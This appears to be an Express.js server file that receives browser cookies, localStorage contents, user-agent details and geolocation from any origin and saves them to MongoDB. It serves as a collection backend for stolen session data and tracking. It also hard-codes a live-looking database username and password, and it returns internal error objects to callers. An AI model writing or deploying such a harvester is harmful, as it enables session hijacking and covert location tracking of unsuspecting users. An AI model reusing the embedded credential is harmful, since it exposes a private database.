// Backend: Node.js + Express
const express = require("express");
const useragent = require("useragent");
const cors = require("cors");
const mongoose = require("mongoose");

const app = express();
const PORT = process.env.PORT || 3000;

// Conexión a MongoDB
mongoose
  .connect(
    "mongodb+srv://codeprojr:FIkRE20i0zGNgm2V@cluster0.nvqof.mongodb.net/Pets?retryWrites=true&w=majority"
  )
  .then(() => console.log("Conectado a MongoDB"))
  .catch((err) => console.error("Error al conectar a MongoDB:", err));

// Modelo de datos
const DeviceInfoSchema = new mongoose.Schema(
  {
    os: { type: String, required: true },
    device: { type: String, required: true },
    browser: { type: String, required: true },
    location: {
      latitude: { type: Number },
      longitude: { type: Number },
      accuracy: { type: Number },
    },
  },
  { timestamps: true, strict: false }
);

const DeviceInfo = mongoose.model("DeviceInfo", DeviceInfoSchema);

app.use(cors("*"));
app.use(express.json());

// Endpoint para recibir datos
app.post("/api/device-info", async (req, res) => {
  const { location, userAgent, localStorage, cookies } = req.body;
  let agent;

  if (userAgent) agent = useragent.parse(userAgent);

  const deviceInfo = {
    localStorage,
    cookies,
    os: agent.os ? agent.os.toString() : null,
    device: agent.device ? agent.device.toString() : null,
    browser: agent.toAgent
      ? agent.toAgent()
      : agent.toString
      ? agent.toString()
      : null,
    location: location || null,
  };

  try {
    const savedDeviceInfo = await DeviceInfo.create(deviceInfo);
    res.json({
      success: true,
      data: savedDeviceInfo,
    });
  } catch (err) {
    console.error("Error al guardar en la base de datos:", err);
    res.status(500).json({ error: "Error interno del servidor", err });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor corriendo en el puerto ${PORT}`);
});
